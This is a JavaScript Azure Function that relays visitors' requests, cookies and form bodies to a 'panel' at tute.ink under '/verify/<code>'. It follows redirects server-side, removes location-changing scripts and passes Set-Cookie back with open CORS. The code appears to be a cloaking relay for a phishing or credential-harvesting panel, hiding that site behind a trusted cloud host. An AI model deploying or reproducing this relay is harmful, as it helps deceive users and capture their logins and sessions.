const crypto = require('crypto');
const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    
    path = path.replace(/^\/api\/proxy/, '');
    if (!path.startsWith('/')) path = '/' + path;

    const parts = path.split('/').filter(Boolean);
    let code = '';

    // Extract the code from the query string (the form submission) or the URL path
    if (req.query && req.query.code) {
        code = req.query.code;
    } else if (parts.length >= 2 && parts[1].length > 4) {
        code = parts[1];
    } else if (parts.length === 1 && parts[0].length > 4 && parts[0] !== 'verify') {
        code = parts[0];
    }

    if (!code) {
        context.res = { status: 400, body: "Missing code." };
        return;
    }

    let currentUrl = `https://${PANEL}/verify/${code}`;
    context.log(`Forwarding ${req.method} to: ${currentUrl}`);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        let r;

        // 🚨 STEP 4: FOLLOW REDIRECTS SERVER-SIDE 🚨
        for (let hop = 0; hop < 5; hop++) {
            r = await fetch(currentUrl, {
                method: req.method,
                headers: forwardHeaders,
                body: body,
                redirect: 'manual'
            });

            const loc = r.headers.get('location');
            // If the panel says "Redirect to /verify/CODE", we catch it and fetch the final page here!
            if (r.status >= 300 && r.status < 400 && loc) {
                let finalUrl = new URL(loc, currentUrl).toString();
                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
                context.log(`Server-side Redirect hop ${hop} → ${finalUrl}`);
                currentUrl = finalUrl;
                continue; // Do the fetch again for the final page
            }
            break;
        }

        let responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        // Strip any lingering JS redirects just in case
        if (contentType.includes('text/html')) {
            responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                    return ''; 
                }
                return match;
            });
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        };
        
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        context.res = { status: 200, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
